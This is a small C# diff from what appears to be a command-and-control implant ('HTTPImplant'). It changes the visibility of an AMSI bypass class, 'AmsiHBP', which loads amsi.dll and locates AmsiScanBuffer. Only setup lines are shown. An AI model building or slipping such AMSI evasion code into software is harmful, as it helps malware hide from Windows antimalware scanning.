@@ -9,7 +9,7 @@ using System.Runtime.InteropServices;
 namespace HTTPImplant.Modules
 {
     // CCOB IS THE GOAT
-    class AmsiHBP
+    public class AmsiHBP
     {
         static IntPtr amsiBase = WinAPI.LoadLibrary("amsi.dll");
         static IntPtr pAmsiScanBuffer = WinAPI.GetProcAddress(amsiBase, "AmsiScanBuffer");
